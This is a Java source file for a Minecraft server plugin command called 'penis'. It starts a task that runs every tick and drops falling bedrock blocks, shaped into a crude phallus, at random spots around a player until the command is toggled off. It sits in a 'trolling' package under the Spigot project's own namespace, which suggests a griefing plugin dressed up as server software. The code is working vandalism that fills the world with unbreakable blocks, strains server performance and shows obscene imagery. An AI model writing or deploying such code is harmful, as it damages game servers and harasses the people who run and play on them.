package org.spigotmc.commands.impl.trolling;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.bukkit.scheduler.BukkitRunnable;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "penis",
    usage = "penis",
    desc = "Makes it rain penises",
    blatant = true
)
public class Penis extends CommandListener{
    private static int ID;
	
    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (ID == 0) {
			ID = new BukkitRunnable() {
				@SuppressWarnings("deprecation")
				public void run() {
					Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
		              int x = (int)p.getLocation().getX() + (int)(Math.random() * 100.0D) - 50;
		              int y = (int)p.getLocation().getY() + 50;
		              int z = (int)p.getLocation().getZ() + (int)(Math.random() * 100.0D) - 50;
		              for (int i = 0; i < 3; i++) {
		                p.getWorld().spawnFallingBlock(new Location(p.getWorld(), x + i, y, z), Material.BEDROCK, (byte) 0);
		              }
		              for (int i = 1; i < 4; i++) {
		                p.getWorld().spawnFallingBlock(new Location(p.getWorld(), x + 1, y + i, z), Material.BEDROCK, (byte) 0);
		              }
					});
		            }
		          }.runTaskTimer(Main.getInstance(), 1L, 1L).getTaskId();
		          p.sendMessage(Settings.PREFIX("Started penis rain"));
		          
		} else {
			Bukkit.getScheduler().cancelTask(ID);
			ID = 0;
			p.sendMessage(Settings.PREFIX("Stopped penis rain"));
		}
	}
}